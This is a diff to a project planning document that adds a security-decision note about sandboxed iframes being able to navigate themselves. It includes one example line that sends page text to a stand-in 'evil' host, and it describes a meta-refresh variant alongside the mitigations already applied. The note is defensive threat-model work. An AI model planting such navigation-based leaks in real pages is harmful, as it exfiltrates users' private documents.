@@ -419,6 +419,22 @@ non-SPA clients like a future CLI); only a **well-formed value whose major diffe
   outside the repo. Will prepare proposed diffs as a doc, not apply.
 - **P5.4 manual rehearsal (T8)** — pre-marked ⛔; needs a live Claude session + Dawid's eyes.
 
+- **⚠ SECURITY DECISION — class-F self-navigation egress (surfaced in P4.1 review; needs Dawid).** The
+  class-F CSP + sandbox genuinely close fetch/XHR/WebSocket/img/form egress (tested), BUT a sandboxed
+  `allow-scripts` iframe can always navigate ITSELF (`location.href="https://evil/leak?"+pageText`, an
+  `<a target=_self>` click, or a **script-free** `<meta http-equiv="refresh">`). The HTML sandbox model
+  always permits self-navigation; CSP has no shipped `navigate-to` directive. So a hostile/compromised
+  class-F artifact could exfiltrate the manuscript (special-category data) — a real hole in A3's stated
+  "doc JS is untrusted, zero external calls" invariant that CANNOT be fully closed with the current
+  mechanism. **P4.1 applied the achievable mitigations** (strip `<meta http-equiv=refresh>` at serve →
+  closes the no-script variant; parent-side post-handshake navigation-detect → teardown + surface a
+  "document attempted to navigate" error, stopping sustained exfil + signalling). **Decision needed from
+  Dawid:** either (a) formally accept this as a documented residual risk and narrow A3's wording to what
+  "no egress" actually promises, OR (b) clarify the real threat model — in glosa's actual use, class-F
+  artifacts are the user's OWN jethro/format-sermon LOCAL output, NOT adversary-supplied HTML, so
+  self-navigation exfil of one's own content isn't a live threat (the browser-based-attacker threat A3
+  targets IS fully handled by the origin-split + CSP + capability). Recommend (b) + a one-line A3 note.
+
 ---
 
 ## SUMMARY
